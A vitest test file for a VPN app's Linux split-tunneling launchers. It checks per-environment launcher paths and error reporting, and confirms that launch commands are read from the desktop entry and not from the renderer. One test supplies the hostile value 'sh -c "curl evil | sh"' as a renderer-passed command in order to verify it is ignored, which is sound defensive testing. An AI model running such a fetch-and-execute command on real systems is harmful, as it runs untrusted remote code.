import fs from 'fs';
import os from 'os';
import path from 'path';
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';

import { importForProductEnv } from './client-rules';

type LinuxSplitTunnelingModule = typeof import('../../src/main/linux-split-tunneling');

function moduleFor(productEnv: string) {
  return importForProductEnv<LinuxSplitTunnelingModule>(
    productEnv,
    '../../src/main/linux-split-tunneling',
  );
}

let stubBinDir: string | undefined;
let realPath: string | undefined;

// The packaging config shells out to `cargo` for the version; see
// `electron-fuses.spec.ts` for why a stand-in answers it.
beforeAll(() => {
  if (process.platform === 'win32') {
    return;
  }
  stubBinDir = fs.mkdtempSync(path.join(os.tmpdir(), 'warren-cargo-stub-'));
  fs.writeFileSync(path.join(stubBinDir, 'cargo'), '#!/bin/sh\necho 1.0.0\n', { mode: 0o755 });
  realPath = process.env.PATH;
  process.env.PATH = `${stubBinDir}${path.delimiter}${realPath ?? ''}`;
});

afterAll(() => {
  if (stubBinDir === undefined) {
    return;
  }
  process.env.PATH = realPath;
  fs.rmSync(stubBinDir, { recursive: true, force: true });
});

async function packagedTargets(productEnv: string): Promise<string[]> {
  vi.resetModules();
  process.env.WARREN_PRODUCT_ENV = productEnv;
  const { newConfig } = await import('../../tasks/distribution.cjs');
  const config = newConfig() as unknown as Record<string, { fpm?: unknown } | undefined>;
  return ['deb', 'rpm', 'pacman'].flatMap((format) =>
    (Array.isArray(config[format]?.fpm) ? (config[format].fpm as unknown[]) : [])
      .filter((arg): arg is string => typeof arg === 'string' && arg.includes('=/'))
      .map((arg) => arg.slice(arg.indexOf('=/') + 1)),
  );
}

// A beta and a production install live side by side, and each package installs
// its launchers under its own suffixed name. The app has to run the launchers
// of its own environment, by absolute path: a bare name either fails on a
// machine that only has the beta, or resolves to the other environment's
// launcher, which puts the program in the other install's cgroup.
describe('the Linux app-routing launchers', () => {
  afterEach(() => {
    delete process.env.WARREN_PRODUCT_ENV;
  });

  const expected = {
    prod: '',
    beta: '-beta',
    staging: '-staging',
  };

  for (const [env, suffix] of Object.entries(expected)) {
    it(`are the ${env} package's own binaries`, async () => {
      const { linuxLauncherPath } = await moduleFor(env);
      const targets = await packagedTargets(env);

      for (const launcher of ['warren-exclude', 'warren-include'] as const) {
        const launcherPath = linuxLauncherPath(launcher);
        expect(launcherPath).toBe(`/usr/bin/${launcher}${suffix}`);
        expect(targets.filter((target) => target === launcherPath)).toHaveLength(3);
      }
    }, 60_000);
  }

  // The renderer names the app; what runs is read from the app's own desktop
  // entry on disk, never taken from the renderer.
  it('runs the command of the desktop entry, not the one the renderer passed', async () => {
    const { getLaunchCommand } = await moduleFor('prod');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'warren-desktop-entry-'));
    try {
      const entry = path.join(dir, 'tool.desktop');
      fs.writeFileSync(
        entry,
        '[Desktop Entry]\nType=Application\nName=Tool\nExec=/usr/bin/tool %U\n',
      );

      const command = await getLaunchCommand({
        absolutepath: entry,
        name: 'Tool',
        exec: 'sh -c "curl evil | sh"',
        type: 'Application',
      });

      expect(command).toEqual(['/usr/bin/tool']);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('reports a launcher that cannot be started instead of announcing a launch', async () => {
    const { launchApplication } = await moduleFor('staging');
    if (fs.existsSync('/usr/bin/warren-exclude-staging')) {
      return;
    }

    const result = await launchApplication('/bin/true');

    expect(result).toHaveProperty('error');
    expect(result).not.toHaveProperty('success');
  });
});
